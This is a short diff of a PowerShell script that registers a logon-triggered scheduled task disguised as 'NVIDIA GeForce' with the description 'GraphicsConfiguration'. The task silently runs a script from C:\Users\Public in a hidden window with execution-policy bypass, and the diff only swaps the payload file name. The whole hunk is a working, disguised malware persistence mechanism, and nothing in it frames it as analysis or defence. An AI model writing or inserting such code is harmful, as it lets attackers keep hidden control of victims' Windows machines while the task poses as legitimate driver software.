@@ -12,7 +12,7 @@ $taskName = "NVIDIA GeForce"
 Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName} -ErrorAction SilentlyContinue -OutVariable task
 
 if (!$task) {
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -NoP -File C:\Users\Public\a.ps1"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -NoP -File C:\Users\Public\pur.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogOn 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description 'GraphicsConfiguration'
 }
